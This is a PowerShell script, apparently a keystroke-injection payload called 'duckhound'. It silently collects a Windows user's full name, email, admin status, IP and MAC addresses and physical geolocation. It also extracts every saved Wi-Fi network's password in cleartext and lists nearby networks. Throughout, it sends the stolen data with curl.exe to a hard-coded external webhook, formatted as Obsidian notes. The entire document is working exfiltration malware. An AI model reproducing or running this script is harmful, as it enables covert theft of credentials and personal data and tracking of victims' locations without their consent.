# duckhound webhook script
# created by : C0SM0 & I am Jakoby

# change me
$webhook = "https://us-central1-obsidian-buffer.cloudfunctions.net/webhook/332fa6cc28b71b33771831cd455417413351fdc033ba73c8"

# variables
$account = $env:userprofile.Split('\')[2] 
$username = $env:username
$markdown = "$account.md"

# network values
$public = curl.exe https://ident.me
$private = (get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}).ipaddress[0]
$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)

# send content to obsidian
function send_to_obsidian {
    
    # file parameter
    [CmdletBinding()]
    param (   
    [Parameter (Position=0,Mandatory = $True)]
    [string]$message, 
    [Parameter (Position=1,Mandatory = $True)]
    [string]$file
    )

    # curl requests
    curl.exe -d "$message" -H "Content-Type: text/plain" $webhook"?path=$file"
}

function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 # If no name is detected function will return NA

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return "NA"
    -ErrorAction SilentlyContinue
    }

    return $fullName 
}

function Get-email {
    
    try {

    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
	return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

function Get-GeoLocation{
    try {
    Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
    $GeoWatcher.Start() #Begin resolving current locaton

    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
        Start-Sleep -Milliseconds 100 #Wait for discovery.
    }  

    if ($GeoWatcher.Permission -eq 'Denied'){
        Write-Error 'Access Denied for Location Information'
    } else {
        $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
        
    }
    }
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

# mark wireless information
function wireless_markdown {
    # get wireless creds
    $SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
    $wifi_info = foreach($SSID in $SSIDS) {
        $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
    }  
    $wifi_json = $wifi_info | ConvertTo-Json | ConvertFrom-Json

    for ($i = 0; $i -le $wifi_json.Length; $i++) {
        $wifi_name = $wifi_json.SSID[$i]
        $wifi_pass = $wifi_json.Password[$i]

        $content = @"
# $wifi_name
- SSID : $wifi_name
- Password : $wifi_pass
- IP : public

## Tags
#wifi
"@
        send_to_obsidian -message $content -file "$wifi_name.md"
    }
    return $wifi_json
}
# mark user information
function user_markdown {

    # general values
    $full_name = Get-fullName
    $email = Get-email
    $is_admin = (Get-LocalGroupMember 'Administrators').Name -contains "$env:COMPUTERNAME\$env:USERNAME"

    # geolocation values
    $GL = (Get-GeoLocation) -split " "
    $latitude = $GL[0].Substring(11) -replace ".$"
    $longitude = $GL[1].Substring(10) -replace ".$"

    # $longitude = '40.7484405'
    # $latitude = '-73.9878531'

    # create markdown content
    $content = @"
# $account

## General
- Full Name : $full_name
- Email : $email

## User Info
- UserName : $username
- UserProfile : $account
- Admin : $is_admin

## Wireless
- Public : public
- Private : $private
- MAC : $MAC

## Connected Networks
"@
    # send data set one
    send_to_obsidian -message $content -file $markdown 

    $wifi_json = wireless_markdown

    for ($i = 0; $i -le $wifi_json.Length; $i++) {
        $wifi_name = $wifi_json.SSID[$i]

        send_to_obsidian -message "- [[$wifi_name]]" -file $markdown
    }

    send_to_obsidian -message "`n## Nearby Networks" -file $markdown

    try {
        $nearby_ssids = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*"}).trim()
    }
    catch {
        $nearby_ssids="No nearby wifi networks detected"
    }

    $nearby_networks = $nearby_ssids | ConvertTo-Json | ConvertFrom-Json

    for ($i = 0; $i -le $nearby_networks.Length; $i++) {
        $formatted_ssid = $nearby_networks[$i].replace(" ", "-")
        send_to_obsidian -message "- #$formatted_ssid" -file $markdown
    }

    $content = @"

## Geolocation
<div class="mapouter"><div class="gmap_canvas"><iframe width="600" height="500" id="gmap_canvas" src="https://maps.google.com/maps?q=$longitude,$latitude&t=k&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe><br><style>.mapouter{position:relative;text-align:right;height:500px;width:600px;}</style><style>.gmap_canvas {overflow:hidden;background:none!important;height:500px;width:600px;}</style></div></div>

## Tags
#user
"@
    # send data set two
    send_to_obsidian -message $content -file $markdown 

}

user_markdown